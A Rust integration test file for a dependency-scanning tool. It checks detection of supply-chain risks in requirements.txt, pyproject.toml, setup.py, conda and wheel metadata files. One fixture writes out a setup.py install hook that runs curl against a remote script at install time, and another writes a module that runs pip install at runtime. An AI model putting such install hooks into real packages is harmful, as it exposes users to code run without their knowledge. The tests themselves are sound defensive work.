//! Dependency and installation supply-chain analysis, end to end
//! through `package::inspect`.

use anyhow::Result;
use layerfault::package;
use layerfault::scanner::ScanStatus;
use std::fs;
use std::path::PathBuf;

fn tempdir(name: &str) -> PathBuf {
    let root =
        std::env::temp_dir().join(format!("layerfault-dep-it-{name}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(&root).expect("create tempdir");
    root
}

fn has_rule(report: &package::PackageReport, rule: &str) -> bool {
    report
        .findings
        .iter()
        .any(|f| f.matches.iter().any(|m| m.contains(rule)))
}

fn has_rule_with_status(report: &package::PackageReport, rule: &str, status: ScanStatus) -> bool {
    report
        .findings
        .iter()
        .any(|f| f.matches.iter().any(|m| m.contains(rule)) && f.status == status)
}

#[test]
fn pinned_hash_locked_requirement_has_no_floating_warning() -> Result<()> {
    let root = tempdir("pinned");
    fs::write(
        root.join("requirements.txt"),
        "package==1.2.3 --hash=sha256:abcdef0123456789\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(!has_rule(&report, "LF-DEP-FLOATING"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn unpinned_requirement_flags_floating() -> Result<()> {
    let root = tempdir("unpinned");
    fs::write(root.join("requirements.txt"), "transformers\n")?;
    let report = package::inspect(&root)?;
    assert!(has_rule_with_status(
        &report,
        "LF-DEP-FLOATING",
        ScanStatus::Warn
    ));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn direct_https_with_hash_flags_direct_url_not_insecure_transport() -> Result<()> {
    let root = tempdir("direct-https");
    fs::write(
        root.join("requirements.txt"),
        "pkg @ https://example.com/pkg.whl#sha256=deadbeef\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-DIRECT-URL"));
    assert!(!has_rule(&report, "LF-DEP-INSECURE-TRANSPORT"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn direct_http_flags_insecure_transport() -> Result<()> {
    let root = tempdir("direct-http");
    fs::write(
        root.join("requirements.txt"),
        "pkg @ http://example.com/pkg.whl\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-DIRECT-URL"));
    assert!(has_rule(&report, "LF-DEP-INSECURE-TRANSPORT"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn git_full_commit_is_pinned_not_mutable() -> Result<()> {
    let root = tempdir("git-commit");
    let sha = "a".repeat(40);
    fs::write(
        root.join("requirements.txt"),
        format!("git+https://github.com/x/y.git@{sha}#egg=y\n"),
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-VCS"));
    assert!(!has_rule(&report, "LF-DEP-VCS-MUTABLE-REF"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn git_branch_is_mutable_ref() -> Result<()> {
    let root = tempdir("git-branch");
    fs::write(
        root.join("requirements.txt"),
        "git+https://github.com/x/y.git@main#egg=y\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-VCS-MUTABLE-REF"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn editable_local_dependency_escaping_root_is_blocked() -> Result<()> {
    let root = tempdir("editable-escape");
    fs::write(root.join("requirements.txt"), "-e ../sibling\n")?;
    let report = package::inspect(&root)?;
    assert!(has_rule_with_status(
        &report,
        "LF-DEP-PATH-ESCAPE",
        ScanStatus::Fail
    ));
    assert!(report.blocking());
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn alternate_index_is_flagged() -> Result<()> {
    let root = tempdir("alt-index");
    fs::write(
        root.join("requirements.txt"),
        "--index-url https://mirror.example.com/simple\npackage==1.0\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-ALT-INDEX"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn trusted_host_is_flagged_insecure() -> Result<()> {
    let root = tempdir("trusted-host");
    fs::write(
        root.join("requirements.txt"),
        "--trusted-host mirror.example.com\npackage==1.0\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-INSECURE-TRANSPORT"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn nested_requirement_includes_resolve() -> Result<()> {
    let root = tempdir("nested-include");
    fs::write(root.join("requirements.txt"), "-r base.txt\n")?;
    fs::write(root.join("base.txt"), "-r inner.txt\n")?;
    fs::write(root.join("inner.txt"), "requests\n")?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-FLOATING"));
    assert!(!has_rule(&report, "LF-DEP-INCLUDE-MISSING"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn requirement_include_cycle_is_bounded() -> Result<()> {
    let root = tempdir("include-cycle");
    fs::write(root.join("requirements.txt"), "-r a.txt\n")?;
    fs::write(root.join("a.txt"), "-r b.txt\n")?;
    fs::write(root.join("b.txt"), "-r a.txt\n")?;
    // Must terminate (bounded by the cycle/depth tracker) rather than hang.
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-ANALYSIS-INCOMPLETE"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn missing_requirement_include_is_flagged() -> Result<()> {
    let root = tempdir("missing-include");
    fs::write(root.join("requirements.txt"), "-r absent.txt\n")?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-INCLUDE-MISSING"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn pyproject_custom_build_backend_is_flagged() -> Result<()> {
    let root = tempdir("pyproject-backend");
    fs::write(
        root.join("pyproject.toml"),
        "[build-system]\nrequires = [\"flit_core\"]\nbuild-backend = \"flit_core.buildapi\"\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-BUILD-BACKEND"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn pyproject_direct_url_dependency_is_flagged() -> Result<()> {
    let root = tempdir("pyproject-direct-url");
    fs::write(
        root.join("pyproject.toml"),
        "[project]\ndependencies = [\"pkg @ https://example.com/pkg.whl\"]\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-DIRECT-URL"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn setup_py_custom_install_hook_with_subprocess_correlates() -> Result<()> {
    let root = tempdir("setup-hook");
    fs::write(
        root.join("setup.py"),
        "import subprocess\nfrom setuptools.command.install import install\n\nclass CustomInstall(install):\n    def run(self):\n        subprocess.run([\"curl\", \"https://example.com/x.sh\"])\n        install.run(self)\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-INSTALL-HOOK"));
    assert!(report
        .correlations
        .iter()
        .any(|c| c.id == "LF-CORR-INSTALL-HOOK-CAPABILITY"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn conda_custom_channel_is_flagged() -> Result<()> {
    let root = tempdir("conda-channel");
    fs::write(
        root.join("environment.yml"),
        "name: env\nchannels:\n  - my-private-channel\ndependencies:\n  - numpy\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-ALT-INDEX"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn wheel_metadata_requires_dist_parses() -> Result<()> {
    let root = tempdir("wheel-metadata");
    fs::create_dir_all(root.join("pkg.dist-info"))?;
    fs::write(
        root.join("pkg.dist-info").join("METADATA"),
        "Metadata-Version: 2.1\nName: pkg\nRequires-Dist: requests (>=2.0)\n\nLong description.\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-FLOATING"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn runtime_pip_install_invocation_in_auto_map_module_correlates() -> Result<()> {
    let root = tempdir("runtime-install");
    fs::write(
        root.join("config.json"),
        br#"{"auto_map":{"AutoModel":"modeling_fixture.Fixture"}}"#,
    )?;
    fs::write(
        root.join("modeling_fixture.py"),
        b"import subprocess\nsubprocess.run(['pip', 'install', 'extra-package'])\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-PY-PACKAGE-INSTALL"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn secret_bearing_url_is_redacted() -> Result<()> {
    let root = tempdir("secret-url");
    fs::write(
        root.join("requirements.txt"),
        "pkg @ https://user:supersecrettoken@example.com/pkg.whl\n",
    )?;
    let report = package::inspect(&root)?;
    let rendered = serde_json::to_string(&report.findings).expect("serialize findings");
    assert!(!rendered.contains("supersecrettoken"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn malformed_toml_flags_analysis_incomplete() -> Result<()> {
    let root = tempdir("malformed-toml");
    fs::write(root.join("pyproject.toml"), "not = [valid toml\n")?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-ANALYSIS-INCOMPLETE"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[test]
fn malformed_yaml_flags_analysis_incomplete() -> Result<()> {
    let root = tempdir("malformed-yaml");
    fs::write(
        root.join("environment.yml"),
        "dependencies: [unterminated\n",
    )?;
    let report = package::inspect(&root)?;
    assert!(has_rule(&report, "LF-DEP-ANALYSIS-INCOMPLETE"));
    let _ = fs::remove_dir_all(root);
    Ok(())
}
